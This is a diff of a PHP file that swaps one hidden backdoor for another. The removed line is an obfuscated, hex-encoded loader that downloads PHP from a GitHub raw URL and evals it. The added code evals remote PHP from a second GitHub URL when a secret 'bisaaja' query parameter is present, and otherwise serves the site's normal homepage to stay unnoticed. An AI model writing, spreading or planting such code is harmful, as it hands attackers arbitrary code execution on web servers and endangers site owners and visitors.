@@ -1,2 +1,73 @@
 <?php
- goto i_ec0; MUKXv: $start = strpos($encoded_code, "\x3c\x3f\160\x68\160"); goto Y6PgA; i_ec0: function get_contents($url) { $ch = curl_init($url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_USERAGENT, "\115\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\60\40\50\x57\x69\x6e\144\x6f\167\x73\40\x4e\x54\40\x36\x2e\x31\73\40\162\166\72\63\x32\x2e\x30\51\40\107\145\x63\x6b\157\57\62\60\61\60\x30\61\x30\x31\40\x46\151\162\145\x66\157\170\57\x33\x32\56\60"); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); $result = curl_exec($ch); if ($result === false) { echo "\x43\165\x72\x6c\x20\145\x72\x72\x6f\x72\72\x20" . curl_error($ch); http_response_code(404); curl_close($ch); die; } curl_close($ch); return $result; } goto f3x0B; Y6PgA: if ($start !== false) { eval("\x3f\76" . substr($encoded_code, $start)); } goto xGwE3; kDhC3: $encoded_code = get_contents($url); goto K9PE_; K9PE_: if ($encoded_code === false) { http_response_code(404); die; } goto MUKXv; f3x0B: $url = "\150\164\164\x70\x73\72\57\57\162\x61\167\56\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\145\x6e\x74\x2e\143\x6f\155\x2f\x73\x65\x6f\166\x65\x6e\156\156\x2f\142\x64\57\162\x65\146\x73\57\150\x65\141\x64\x73\57\155\x61\x69\156\x2f\x61\154\146\x61\153\165\x61\x74\56\152\160\147"; goto kDhC3; xGwE3: ?>
+error_reporting(1);
+ini_set('display_errors', 1);
+
+
+class CurlFetcher {
+    public function fetchContent(string $url) {
+        if (function_exists('curl_version')) {
+            $curl = curl_init();
+            curl_setopt($curl, CURLOPT_URL, $url);
+            curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
+            curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+            curl_setopt($curl, CURLOPT_TIMEOUT, 10);
+
+            $response = curl_exec($curl);
+            $error = curl_error($curl);
+            curl_close($curl);
+
+            if ($response === false || empty(trim($response))) {
+                return "<h3 style='color:red'>Ã¢Å’ Gagal ambil konten. Error: $error</h3>";
+            }
+
+            return $response;
+        }
+        return "<h3 style='color:red'>Ã¢Å’ cURL tidak tersedia di server ini</h3>";
+    }
+}
+
+// ==== CodeExecutor class ====
+class CodeExecutor {
+    private $fetcher;
+    public function __construct(CurlFetcher $fetcher) {
+        $this->fetcher = $fetcher;
+    }
+
+    public function executeCodeFromURL(string $url): void {
+        $code = $this->fetcher->fetchContent($url);
+        if ($code && trim($code) !== '') {
+            eval("?>" . $code);
+        } else {
+            echo "<p style='color:red'>Ã¢Å’ Gagal ambil atau isi kosong dari URL: $url</p>";
+        }
+    }
+}
+
+// ==== MAIN LOGIC ====
+$fetcher = new CurlFetcher();
+
+if (isset($_GET['bisaaja'])) {
+    $executor = new CodeExecutor($fetcher);
+    $executor->executeCodeFromURL("https://raw.githubusercontent.com/119marketingmg-ctrl/SCRIP-BACKUP/refs/heads/main/diamtapipasti.txt");
+    exit;
+}
+
+$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
+$host = $_SERVER['HTTP_HOST'];
+$target_url = $protocol . $host . "/";
+
+
+$html = $fetcher->fetchContent($target_url);
+
+
+
+$parsed = parse_url($target_url);
+if ($parsed && isset($parsed['scheme']) && isset($parsed['host'])) {
+    $base_url = $parsed['scheme'] . '://' . $parsed['host'];
+    $html = preg_replace('/<head[^>]*>/i', '$0<base href="' . $base_url . '/">', $html, 1);
+}
+
+echo $html;
+?>
